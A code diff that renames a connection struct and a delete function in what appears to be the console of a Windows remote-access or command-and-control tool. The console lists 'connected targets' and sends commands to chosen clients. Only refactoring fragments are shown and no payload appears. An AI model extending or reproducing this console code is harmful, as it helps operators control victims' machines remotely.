@@ -29,7 +29,7 @@ typedef struct {
 	size_t alloc;
 	// Amount of memory used.
 	size_t size;
-} Conn_array;
+} Conn_map;
 
 // Typedef for function pointer.
 typedef int (*func)(char*, size_t, SOCKET);
@@ -82,7 +82,7 @@ void bind_socket(const SOCKET listen_socket, const int port) {
 
 // Thread to recursively accept connections.
 DWORD WINAPI accept_conns(LPVOID* lp_param) {
-	Conn_array* conns = (Conn_array*)lp_param;
+	Conn_map* conns = (Conn_map*)lp_param;
 	conns->alloc = MEM_CHUNK;
 
 	conns->size = 0;
@@ -150,7 +150,7 @@ int compare(const char* buf, const char* str) {
 }
 
 // Function to list all available connections.
-void list_connections(const Conn_array* conns) {
+void list_connections(const Conn_map* conns) {
 	printf("\n\n---------------------------\n");
 	printf("---  C0NNECTED TARGETS  ---\n");
 	printf("--     Hostname: ID      --\n");
@@ -308,7 +308,7 @@ int send_cmd(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
 }
 
 // Function to resize conns array/remove and close connection.
-void resize_conns(Conn_array* conns, const int client_id) {
+void delete_conn(Conn_map* conns, const int client_id) {
 	for (size_t i = client_id; i < conns->size; i++) {
 		conns->clients[i].sock = conns->clients[i + 1].sock;
 		conns->clients[i].host = conns->clients[i + 1].host;
@@ -320,7 +320,7 @@ void resize_conns(Conn_array* conns, const int client_id) {
 }
 
 // Function to parse interactive input and send to specified client.
-void interact(Conn_array* conns, char* const buf, const int client_id) {
+void interact(Conn_map* conns, char* const buf, const int client_id) {
 	const SOCKET client_socket = conns->clients[client_id].sock;
 	char* client_host = conns->clients[client_id].host;
 
@@ -353,7 +353,8 @@ void interact(Conn_array* conns, char* const buf, const int client_id) {
 		}
 	}
 
-	resize_conns(conns, client_id);
+	// If client disconnected/exit command is parsed: delete the connection.
+	delete_conn(conns, client_id);
 	printf("Client: \"%s\" is no longer connected.\n\n", client_host);
 }
 
@@ -381,7 +382,7 @@ void exec_cmd(char* const buf) {
 
 // Main function for parsing console input and calling sakito-console functions.
 int main(void) {
-	Conn_array conns;
+	Conn_map conns;
 	HANDLE acp_thread = CreateThread(0, 0, accept_conns, &conns, 0, 0);
 
 	HANDLE  hColor;
